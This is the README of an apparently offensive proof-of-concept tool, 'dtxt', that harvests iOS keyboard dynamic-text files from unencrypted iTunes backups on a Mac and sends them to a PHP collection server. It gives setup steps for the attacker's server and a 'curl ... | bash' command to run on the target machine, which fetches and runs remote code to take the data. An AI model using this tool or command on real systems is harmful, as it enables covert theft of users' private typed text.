dtxt
====

iOS stores text in /private/var/mobile/Library/Keyboard/dynamic-text.dat. If a user backs up their device with iTunes, without encryption, then the text is availible in plain text.

dtxt is a proof of concept that attempts to grab all dynamic-text.dat data for all iOS device that have been backed up with iTunes on any given Mac.

Setup:
1. Put d.txt, d.py, and index.php on a web server that supports PHP.
2. In d.txt edit the value of r_path variable.
3. In index.php edit the target_path variable - set it to a directory that the web server can write to.

Run:
To execute the dtxt run the following command on the target system:
curl -s http://&lt;domain.com&gt;/dtxt/d.txt | bash 

